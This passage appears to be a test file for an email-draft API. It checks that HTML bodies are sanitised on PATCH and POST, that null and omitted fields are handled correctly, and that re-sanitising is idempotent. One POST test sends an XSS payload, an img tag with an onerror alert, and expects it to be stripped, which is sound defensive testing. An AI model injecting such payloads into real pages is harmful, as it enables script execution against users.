    const html = '<p>Hi <strong>Ann</strong></p><ul><li><em>one</em></li></ul>'

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: html })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml).toBe(html)
  })

  it('PATCH still stores an explicit null — clearing the body is a real edit', async () => {
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: null })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).toEqual({ bodyHtml: null })
  })

  it('PATCH does not touch bodyHtml when the body did not carry it', async () => {
    // Sanitising must not become a reason to write a key the caller left out —
    // that would blank a half-written email every time a card is collapsed.
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ isMinimized: true })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).not.toHaveProperty('bodyHtml')
  })

  it('POST sanitises too, because a composer opened from a record lands with a body', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ bodyHtml: '<p>Hi</p><img src=x onerror="alert(1)">' })

    expect(res.status).toBe(201)
    expect(prismaMock.emailDraft.create.mock.calls[0][0].data.bodyHtml).toBe('<p>Hi</p>')
  })

  it('POST with no body still stores null, not an empty string', async () => {
    await request(app).post(URL_A).set('Authorization', AUTH).send({})

    expect(prismaMock.emailDraft.create.mock.calls[0][0].data.bodyHtml).toBeNull()
  })

  it('re-saving what the server already stored changes nothing', async () => {
    // Autosave sends the body dozens of times per email. A sanitiser that
    // mangled its own output would corrupt a draft one keystroke at a time.
    const first = '<p>Hi <strong>Ann</strong></p><a href="https://acme.example" target="_blank">x</a>'

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: first })
    const once = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml as string

    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: once })
    const twice = prismaMock.emailDraft.updateMany.mock.calls[1][0].data.bodyHtml as string

    expect(twice).toBe(once)
  })
})
